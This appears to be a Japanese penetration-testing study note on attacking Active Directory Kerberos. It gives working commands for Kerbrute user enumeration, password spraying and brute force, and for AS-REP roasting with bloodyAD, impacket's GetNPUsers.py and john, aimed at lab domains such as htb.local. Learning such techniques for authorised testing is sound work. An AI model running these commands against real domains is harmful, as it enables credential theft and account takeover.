## ## Kerberos事前認証の悪用
Kerbruteは、Keruberos事前認証を悪用して有効なADユーザをブルートフォースで列挙するためのツール。
※hostsの登録が必要

### ### Kerbruteインストール
[https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases
↑から自分のKaliのアーキテクチャに合ったやつをダウンロード。

1. ダウンロードしたファイルの名前を変更する。
```sh
mv ./kerbrute_linux_amd64 ./kerbrute
```

2. Kerberusを使用したユーザの列挙
```sh
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```
※syntaxエラーが出るときは、/etc/hostsがミスってるかも

- 豆知識
	-t：threadを設定できる。(デフォルト:10)
	-v：エラーが表示される。
	-d：ドメイン指定 ※必須
	--dc：ドメインコントローラ指定 ※必須

---
## ## AS-REP Roast
Kerberos事前認証(PREAUTH)が必要な属性を持たないユーザを標的とするセキュリティ攻撃。
この脆弱性は、攻撃者はユーザのパスワードを必要とせず、ドメコン(DC)からユーザの認証をリクエストできる。
その後DCは、ユーザのパスワード由来のキーで暗号化されたメッセージで応答し、攻撃者はオフラインでそのユーザのパスワードを特定するために、クラックをこころみることができる。

### ### この攻撃の主な要件は以下の通り。

1. Kerberos事前認証の不足:標的ユーザはこのセキュリティ機能が有効になっていない必要がある。

2. ドメインコントローラ(DC)への接続:攻撃者はリクエストを送信し、暗号化されたメッセージを受信するためにDCへのアクセスが必要。

3. オプションのドメインアカウント:ドメインアカウントを持っていると、LDAPクエリを使用して脆弱なユーザを効率的に特定できる。このようなアカウントがない場合、攻撃者はユーザ名を推測する必要がある。

※参照
[HackTrick](https://book.hacktricks.xyz/v/jp/windows-hardening/active-directory-methodology/asreproast)

### ### 手順
#### #### 1. ユーザ名を取得する必要がある。
1.1. ドメインの資格情報がある場合
```sh
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

1.2. ドメインの資格情報がない場合
Forestというマシンでは、enum4linux-ngでユーザ名を手に入れることが出来た。

#### #### 2. 手に入れたユーザ名をもとにパスワードを取得する。
hostsに登録しておく必要がある。

2.2. 以下の書式を行う。

```sh
python3 GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

▼使用例
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```
<GetNPUsers.pyのダウンロードリンク>
[https://www.secureauth.com/labs/open-source-tools/impacket/](https://www.secureauth.com/labs/open-source-tools/impacket/)

#### #### 3. パスワードをクラックする。

```sh
john --wordlist=passwords_kerb.txt hashes.asreproast
```

- User名を列挙するか、総当たり攻撃で見つけ出す必要がある。
	- User名を列挙する場合は、空いているポートを確認しそこからユーザ名を列挙できる方法がないかを探す必要がある。
	- 総当たりの場合はwordlistを使用して探す必要がある。

## ## Kerbruteを使用するやり方(user列挙)
```sh
kerbrute userenum --dc 10.10.10.161 -d htb.local userlist.txt
```
---
## ## Password BruteForce
### ### kerbrute
基本的に単一ユーザでのブルートフォースはアカウントロックされるので推奨はしない。
代わりにパスワードスプレー攻撃をするのが良い。

- Password Spry attack
```sh
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
```

- Brute Force
```sh
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```

---
